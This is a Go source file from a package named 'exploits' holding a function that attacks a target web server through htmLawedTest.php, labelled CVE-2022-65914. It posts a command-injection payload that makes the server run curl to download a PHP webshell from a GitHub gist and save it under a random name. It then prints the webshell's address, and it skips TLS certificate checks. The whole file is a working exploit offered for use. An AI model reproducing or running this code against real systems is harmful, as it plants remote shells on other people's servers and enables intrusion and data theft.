package exploits

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"net/http"
	"net/url"

	uuid "github.com/satori/go.uuid"
)

func CVE202265914(target string) {

	if CheckCVE202265914(target) {
		random := uuid.NewV4()

		client := &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		}

		payload := url.QueryEscape("curl https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php -o " + random.String() + ".php")
		data := []byte("sid=foo&hhook=exec&text=" + payload)
		req, err := http.NewRequest("POST", target+"/vendor/htmlawed/htmlawed/htmLawedTest.php", bytes.NewBuffer(data))
		if err != nil {
			fmt.Println("Error", err)
		}

		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("Content-Length", "26")
		req.Header.Set("Connection", "close")
		req.Header.Set("Cookie", "sid=foo")

		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("Error", err)
		}
		defer resp.Body.Close()
		fmt.Println("Webshell Uploaded to: " + target + "/vendor/htmlawed/htmlawed/" + random.String() + ".php")
	} else {
		fmt.Println("Target is patched !")
	}
}
